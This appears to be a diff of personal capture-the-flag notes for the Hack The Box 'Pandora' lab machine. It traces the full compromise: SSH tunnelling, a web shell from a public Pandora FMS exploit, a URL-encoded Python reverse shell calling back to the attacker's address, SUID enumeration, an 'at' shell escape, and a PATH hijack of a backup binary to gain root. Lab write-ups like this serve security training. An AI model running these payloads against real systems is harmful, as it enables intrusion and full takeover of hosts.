@@ -85,7 +85,7 @@ tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      
 tcp6       0      0 :::80                   :::*                    LISTEN      -                   
 tcp6       0      0 :::22                   :::*                    LISTEN      - 
 
-// port 53 is listening on 127.0.0.53
+
 
 //check http service conf, get another domainname for dir of pandora, which is supposed to be access on localhost only
 
@@ -102,6 +102,10 @@ daniel@pandora:/etc/apache2/sites-enabled$ cat pandora.conf
   CustomLog /var/log/apache2/access.log combined
 </VirtualHost>
 
+//local portforwarding, or use dynamic port forwarding
+
+ssh -L localhost:9000:127.0.0.1:80 daniel@10.10.11.136
+ssh -D 9000 daniel@10.10.11.136
 
 http://127.0.0.1:9000/pandora_console/
 v7.0NG.742_FIX_PERL2020 //it is pandora fms
@@ -111,7 +115,7 @@ https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/blob/ma
 http://127.0.0.1:9000/pandora_console/images/cmd.php?test=id
 uid=1000(matt) gid=1000(matt) groups=1000(matt)
 
-http://127.0.0.1:9000/pandora_console/images/cmd.php?test=export%20RHOST=%2210.10.16.10%22;export%20RPORT=8821;python3%20-c%20%27import%20sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(%22RHOST%22),int(os.getenv(%22RPORT%22))));[os.dup2(s.fileno(),fd)%20for%20fd%20in%20(0,1,2)];pty.spawn(%22sh%22)%27
+http://127.0.0.1:9001/pandora_console/images/cmd.php?test=export%20RHOST=%2210.10.16.16%22;export%20RPORT=8821;python3%20-c%20%27import%20sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(%22RHOST%22),int(os.getenv(%22RPORT%22))));[os.dup2(s.fileno(),fd)%20for%20fd%20in%20(0,1,2)];pty.spawn(%22sh%22)%27
 
 └─$ nc -nvlp 8821
 listening on [any] 8821 ...
@@ -119,4 +123,115 @@ connect to [10.10.16.10] from (UNKNOWN) [10.10.11.136] 36668
 $ python3 -c "import pty;pty.spawn('/bin/bash')"
 python3 -c "import pty;pty.spawn('/bin/bash')"
 matt@pandora:/var/www/pandora/pandora_console/images$ 
+
+find / -writable -user root -type f -perm -u=x 2>/dev/null
+
+-rwsr-x--- 1 root matt 16816 Dec  3  2021 /usr/bin/pandora_backup
+
+matt@pandora:/home/matt/.ssh$ find / -perm -u=s 2>/dev/null
+find / -perm -u=s 2>/dev/null
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/bin/pandora_backup
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/at
+/usr/bin/fusermount
+/usr/bin/chsh
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+
+
+matt@pandora:/usr/bin$ ./pandora_backup
+./pandora_backup
+PandoraFMS Backup Utility
+Now attempting to backup PandoraFMS client
+tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
+tar: Error is not recoverable: exiting now
+Backup failed!
+Check your permissions!
+// the reason is: prevented any shells that are children of Apache from accessing SUID binaries 
+// what to do is break the restrict shell, ssh to host or , use -u=s at to spawn a shell.
+
+//way1:
+echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
+
+//way2:
+ssh-keygen -t rsa 
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/ed/.ssh/id_rsa): /tmp/ssh/id_rsa
+Enter passphrase for "/tmp/ssh/id_rsa" (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /tmp/ssh/id_rsa
+Your public key has been saved in /tmp/ssh/id_rsa.pub
+The key fingerprint is:
+SHA256:cCsaciQ8eIVUNc6K23VPQcSw/zTEkKCiCTCHUxuXqDs ed@kali
+The key's randomart image is:
++---[RSA 3072]----+
+|o+=++oo o=+.     |
+|+=o=.o o ooo     |
+|oo* o = o . o    |
+|.o B o o o o     |
+| .= + o S o o    |
+|E  = + o o o .   |
+| .. o     . .    |
+|                 |
+|                 |
++----[SHA256]-----+
+                               
+└─$ python3 -m http.server 80   
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.136 - - [14/Dec/2025 08:55:24] "GET /id_rsa.pub HTTP/1.1" 200 -
+
+
+└─$ ssh -i id_rsa matt@10.10.11.136
+
+//now we are matt now, can run the backup binary, which started to backup, try tar * under that folder to ES failed. means here not use tar *
+
+
+matt@pandora:/var/www/pandora/pandora_console$ ltrace /usr/bin/pandora_backup
+getuid()                                                     = 1000
+geteuid()                                                    = 1000
+setreuid(1000, 1000)                                         = 0
+puts("PandoraFMS Backup Utility"PandoraFMS Backup Utility
+)                            = 26
+puts("Now attempting to backup Pandora"...Now attempting to backup PandoraFMS client
+)                  = 43
+system("tar -cvf /root/.backup/pandora-b"...tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
+tar: Error is not recoverable: exiting now
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                       = 512
+puts("Backup failed!\nCheck your permis"...Backup failed!
+Check your permissions!
+)                 = 39
++++ exited (status 1) +++
+
+//tar command is not full path 
+
+matt@pandora:/tmp$ nano tar
+
+cat tar
+#!/bin/bash
+/bin/bash
+
+matt@pandora:/tmp$ chmod +x tar
+matt@pandora:/tmp$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+matt@pandora:/tmp$ export PATH=/tmp:$PATH
+matt@pandora:/tmp$ echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+
+matt@pandora:/tmp$ /usr/bin/pandora_backup
+PandoraFMS Backup Utility
+Now attempting to backup PandoraFMS client
+root@pandora:/tmp# id
+uid=0(root) gid=1000(matt) groups=1000(matt)
 
